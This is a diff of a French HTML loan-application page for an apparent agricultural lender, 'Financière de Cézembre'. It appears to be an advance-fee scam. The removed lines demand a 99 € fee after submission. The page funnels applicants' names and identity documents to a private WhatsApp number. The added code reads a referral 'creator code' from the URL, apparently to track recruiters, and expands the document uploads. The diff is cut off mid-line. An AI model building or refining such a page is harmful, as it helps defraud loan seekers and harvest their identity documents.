@@ -329,18 +329,6 @@
         .secure-form-badge i { color: var(--success); font-size: 1rem; }
         .secure-form-badge p { font-size: 0.58rem; color: #666; line-height: 1.2; text-align: left; font-weight: 500; }
 
-        .form-notice-fee {
-            background: #fdfaf3;
-            border: 1px solid var(--gold);
-            padding: 8px;
-            border-radius: 4px;
-            margin-bottom: 10px;
-            font-size: 0.68rem;
-            color: var(--navy);
-            line-height: 1.4;
-            font-weight: 600;
-        }
-
         .scrolling-security {
             background: #f0f4f8; color: #004085; font-size: 0.65rem; padding: 4px 0; margin: 6px 0;
             overflow: hidden; white-space: nowrap; border-top: 1px solid #d1ecf1; border-bottom: 1px solid #d1ecf1;
@@ -519,7 +507,7 @@
                 
                 <div style="background: #fdfaf3; border: 1px solid var(--gold); padding: 8px; border-radius: 4px; font-size: 0.72rem; margin-bottom: 8px;">
                     <p><strong>Code de référence :</strong> <span id="refCodeDisplay" style="color: var(--navy); font-weight: 800;">#CEZ-RURAL-2026</span></p>
-                    <p style="margin-top: 3px;"><strong>Contribution technique :</strong> 99 € (~105 USD)</p>
+                    <p id="creatorCodeDisplay" style="margin-top: 3px; display:none;"><strong>Code Créateur :</strong> <span id="creatorCodeVal" style="color: var(--navy); font-weight: 800;"></span></p>
                 </div>
 
                 <div style="background: #e8f4fd; border: 1px solid #b8daff; padding: 8px; border-radius: 4px; margin-bottom: 8px; font-size: 0.67rem; color: #004085; line-height: 1.4;">
@@ -531,12 +519,12 @@
                 </p>
 
                 <div style="background: #f8f9fa; border: 1px solid #ddd; padding: 8px; border-radius: 4px; margin-bottom: 8px;">
-                    <label style="font-size: 0.67rem; font-weight: 700; color: var(--navy); display: block; margin-bottom: 4px;">1. Joindre votre pièce d'identité (ou photo) :</label>
-                    <input type="file" id="idFileDoc" accept=".jpg, .jpeg, .png, .pdf" style="font-size: 0.65rem; width: 100%; margin-bottom: 5px;">
-                    <button type="button" onclick="uploadDocument()" style="background: var(--navy); color: white; border: none; padding: 6px 10px; font-size: 0.67rem; font-weight: 700; border-radius: 3px; cursor: pointer; width: 100%;">Télécharger et envoyer le document</button>
+                    <label style="font-size: 0.67rem; font-weight: 700; color: var(--navy); display: block; margin-bottom: 4px;">1. Joindre vos documents (jusqu'à 10 fichiers/images) :</label>
+                    <input type="file" id="idFileDoc" accept=".jpg, .jpeg, .png, .pdf,.doc,.docx" multiple max="10" style="font-size: 0.65rem; width: 100%; margin-bottom: 5px;">
+                    <button type="button" onclick="uploadDocument()" style="background: var(--navy); color: white; border: none; padding: 6px 10px; font-size: 0.67rem; font-weight: 700; border-radius: 3px; cursor: pointer; width: 100%;">Télécharger et envoyer les documents</button>
                 </div>
 
-                <a id="waDirectBtn" href="https://wa.me/33780976404?text=Bonjour,%20mon%20code%20de%20référence%20est%20%23CEZ-RURAL-2026.%20Je%20souhaite%20finaliser%20la%20vérification%20d'identité%20par%20ce%20moyen." target="_blank" style="display: flex; align-items: center; justify-content: center; gap: 8px; background: var(--whatsapp); color: white; padding: 8px; border-radius: 4px; text-decoration: none; font-size: 0.72rem; font-weight: 700; margin-bottom: 8px;">
+                <a id="waDirectBtn" href="https://wa.me/33780976404?text=Bonjour" target="_blank" style="display: flex; align-items: center; justify-content: center; gap: 8px; background: var(--whatsapp); color: white; padding: 8px; border-radius: 4px; text-decoration: none; font-size: 0.72rem; font-weight: 700; margin-bottom: 8px;">
                     <i class="fab fa-whatsapp" style="font-size: 1rem;"></i> 2. Envoyer rapidement via WhatsApp
                 </a>
 
@@ -551,6 +539,7 @@
         <form id="loanForm" action="https://api.web3forms.com/submit" method="POST" onsubmit="validateAndSubmit(event)">
             <input type="hidden" name="access_key" value="0fbe97fe-cba4-4d00-b301-9a8fd6bc20f3">
             <input type="hidden" name="subject" value="Nouveau dossier agricole soumis - Financière de Cézembre">
+            <input type="hidden" name="code_createur" id="inputCodeCreateur" value="">
             
             <input type="text" name="nom" id="inputNom" placeholder="Nom et Prénom du Porteur" class="form-input" required>
             
@@ -696,10 +685,6 @@
             
             <textarea name="message" placeholder="Détail et répartition sommaire du budget (ex: matériel, bêtes, semences)..." class="form-input" style="min-height: 45px; resize: vertical; padding: 8px;" required></textarea>
 
-            <div class="form-notice-fee">
-                💡 <strong>Contribution d'ingénierie :</strong> Une contribution unique de <strong>99 € (105 USD)</strong> est requise immédiatement après la soumission de votre dossier pour enclencher l'instruction technique (24-48h).
-            </div>
-
             <button type="submit" class="btn-main">SOUMETTRE LE DOSSIER</button>
             
             <div class="secure-form-badge">
@@ -840,7 +825,14 @@
 <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 
 <script>
+    // Récupération automatique du code créateur depuis l'URL (ex: ?createur=XYZ ou ?ref=XYZ)
     window.addEventListener('DOMContentLoaded', () => {
+        const urlParams = new URLSearchParams(window.location.search);
+        const codeCreateur = urlParams.get('createur') || urlParams.get('ref') || '';
+        if (codeCreateur) {
+            document.getElementById('inputCodeCreateur').value = codeCreateur;
+        }
+
         const currentUrl = encodeURIComponent(window.location.href);
         const shareTitle = encodeURIComponent("Soutien et Financement Agricole - Financière de Cézembre");
         
@@ -1055,29 +1047,23 @@
                     document.getElementById('refCodeDisplay').innerText = generatedRefCode;
                     
                     const clientNom = document.getElementById('inputNom').value || "Client";
-                    const waUrl = `https://wa.me/33780976404?text=Bonjour,%20je%20suis%20${encodeURIComponent(clientNom)}.%20Mon%20code%20de%20référence%20est%20${generatedRefCode}.%20Je%20souhaite%20finaliser%20la%20vérification%20d'identité%20et%20régler%20la%20contribution%20technique%20de%2099€.`;
-                    document.getElementById('waDirectBtn').href = waUrl;
+                    const codeCreateur = document.getElementById('inputCodeCreateur').value;
+                    
+                    if(codeCreateur) {
+                        document.getElementById('creatorCodeVal').innerText = codeCreateur;
+                        document.getElementById('creatorCodeDisplay').style.display = 'block';
+                    }
 
-                    document.getElementById('success-message').style.display = 'block';
-                }, 3000);
-            } else {
-                alert("Une erreur est survenue lors de l'envoi du dossier.");
-                document.getElementById('loader-overlay').style.display = 'none';
-            }
-        } catch (error) {
-            alert("Erreur de connexion réseau lors de l'envoi du dossier.");
-            document.getElementById('loader-overlay').style.display = 'none';
-        }
-    }
+                    // Traduction automatique du message WhatsApp selon le contexte / langue sélectionnée
+                    const activeLangElement = document.getElementById('current-name').innerText;
+                    let waMessage = `Bonjour, je suis ${clientNom}. Mon code de référence est ${generatedRefCode}.` + (codeCreateur ? ` Code créateur : ${codeCreateur}.` : '') + ` Je souhaite finaliser mon dossier.`;
+                    
+                    if(activeLangElement.includes("ESPAÑOL")) {
+                        waMessage = `Hola, soy ${clientNom}. Mi código de referencia es ${generatedRefCode}.` + (codeCreateur ? ` Código de creador: ${codeCreateur}.` : '') + ` Deseo finalizar mi expediente.`;
+                    } else if(activeLangElement.includes("ENGLISH")) {
+                        waMessage = `Hello, I am ${clientNom}. My reference code is ${generatedRefCode}.` + (codeCreateur ? ` Creator code: ${codeCreateur}.` : '') + ` I wish to finalize my file.`;
+                    } else if(activeLangElement.includes("PORTUGUÊS")) {
+                        waMessage = `Olá, sou ${clientNom}. Meu código de referência é ${generatedRefCode}.` + (codeCreateur ? ` Código do criador: ${codeCreateur}.` : '') + ` Desejo finalizar meu processo.`;
+                    }
 
-    function uploadDocument() {
-        const fileInput = document.getElementById('idFileDoc');
-        if(fileInput.files.length === 0) {
-            alert("Veuillez sélectionner un fichier (photo ou pièce d'identité) avant d'envoyer.");
-            return;
-        }
-        alert("Fichier pris en compte avec succès pour votre dossier " + generatedRefCode + ". Veuillez cliquer sur WhatsApp pour l'envoyer directement ou finaliser l'instruction.");
-    }
-</script>
-</body>
-</html>
+                    const waUrl = `https://wa.me
